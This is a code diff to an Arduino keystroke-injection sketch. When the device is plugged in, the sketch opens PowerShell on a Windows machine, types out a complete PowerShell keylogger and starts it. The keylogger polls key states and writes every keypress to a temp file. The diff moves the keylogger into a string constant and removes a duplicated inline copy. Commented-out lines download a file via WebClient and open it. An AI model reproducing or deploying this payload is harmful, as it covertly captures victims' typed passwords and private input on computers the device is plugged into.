@@ -1,6 +1,7 @@
 #include <Keyboard.h>
 
-#define KEY_LEFT_CTRL 0x80
+char SCRIPT[] = "function Start-KeyLogger($Path=\"$env:temp\keylogger.txt\") \n { \n # Signatures for API Calls \n $signatures = @' \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \n public static extern short GetAsyncKeyState(int virtualKeyCode); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int GetKeyboardState(byte[] keystate); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int MapVirtualKey(uint uCode, int uMapType); \n [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags); \n'@ \n \n # load signatures and make members available \n $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru \n \n # create output file \n $null = New-Item -Path $Path -ItemType File -Force \n \n try \n { \n Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red \n \n # create endless loop. When user presses CTRL+C, finally-block \n # executes and shows the collected key presses \n while ($true) { \n Start-Sleep -Milliseconds 40 \n \n # scan all ASCII codes above 8 \n for ($ascii = 9; $ascii -le 254; $ascii++) { \n # get current key state \n $state = $API::GetAsyncKeyState($ascii) \n \n # is key pressed? \n if ($state -eq -32767) { \n $null = [console]::CapsLock \n \n # translate scan code to real code \n $virtualKey = $API::MapVirtualKey($ascii, 3) \n \n # get keyboard state for virtual keys \n $kbstate = New-Object Byte[] 256 \n $checkkbstate = $API::GetKeyboardState($kbstate) \n \n # prepare a StringBuilder to receive input key \n $mychar = New-Object -TypeName System.Text.StringBuilder \n \n # translate virtual key \n $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0) \n \n if ($success) \n { \n # add key to logger file \n [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n } \n } \n } \n } \n } \n finally \n { \n # open logger file in Notepad \n notepad $Path \n } \n } \n";
+
 #define KEY_LEFT_SHIFT 0x81
 #define KEY_LEFT_ALT  0x82
 #define KEY_LEFT_GUI  0x83
@@ -38,96 +39,16 @@
 
 void setup() {
   Keyboard.begin();
-
+  Serial.begin(9600);
   delay(500);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
   Keyboard.println("powershell");
-  delay(100);
-  Keyboard.print("function Start-KeyLogger($Path="$env: temp\keylogger.txt")
-                 {
-                 $signatures = @'
-                 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-                 public static extern short GetAsyncKeyState(int virtualKeyCode);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int GetKeyboardState(byte[] keystate);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int MapVirtualKey(uint uCode, int uMapType);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-                 '@
-                 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-                 $null = New-Item -Path $Path -ItemType File -Force
-                 try
-                 {
-                 Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
-                 while ($true) {
-                 Start-Sleep -Milliseconds 40
-                 for ($ascii = 9; $ascii -le 254; $ascii++) {
-                 $state = $API::GetAsyncKeyState($ascii)
-                 if ($state -eq -32767) {
-                 $null = [console]::CapsLock
-                 $virtualKey = $API::MapVirtualKey($ascii, 3)
-                 $kbstate = New-Object Byte[] 256
-                 $checkkbstate = $API::GetKeyboardState($kbstate)
-                 $mychar = New-Object -TypeName System.Text.StringBuilder
-                 $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-                 if ($success)
-                 {
-                 [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
-               }
-               }
-               }
-               }
-               }
-                 finally
-                 {
-                 notepad $Path
-               }
-               }function Start-KeyLogger($Path="$env: temp\keylogger.txt")
-                 {
-                 $signatures = @'
-                 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-                 public static extern short GetAsyncKeyState(int virtualKeyCode);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int GetKeyboardState(byte[] keystate);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int MapVirtualKey(uint uCode, int uMapType);
-                 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-                 '@
-                 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-                 $null = New-Item -Path $Path -ItemType File -Force
-                 try
-                 {
-                 Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
-                 while ($true) {
-                 Start-Sleep -Milliseconds 40
-                 for ($ascii = 9; $ascii -le 254; $ascii++) {
-                 $state = $API::GetAsyncKeyState($ascii)
-                 if ($state -eq -32767) {
-                 $null = [console]::CapsLock
-                 $virtualKey = $API::MapVirtualKey($ascii, 3)
-                 $kbstate = New-Object Byte[] 256
-                 $checkkbstate = $API::GetKeyboardState($kbstate)
-                 $mychar = New-Object -TypeName System.Text.StringBuilder
-                 $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-                 if ($success)
-                 {
-                 [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
-               }
-               }
-               }
-               }
-               }
-                 finally
-                 {
-                 notepad $Path
-               }
-               }
-                 Start-KeyLogger");
+  delay(500);
+  Keyboard.print(SCRIPT);
+  Keyboard.println("Start-KeyLogger");
   /*Keyboard.println("*New/Object System.Net.WebClient(.DownloadFile*@http>&&localhost&CodePNG.png@, @$*$Env>userprofile(&Desktop&CodePNG.png@(");
     Keyboard.println("Invoke/item $Env>userprofile&Desktop&CodePNG.png");*/
   /*Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
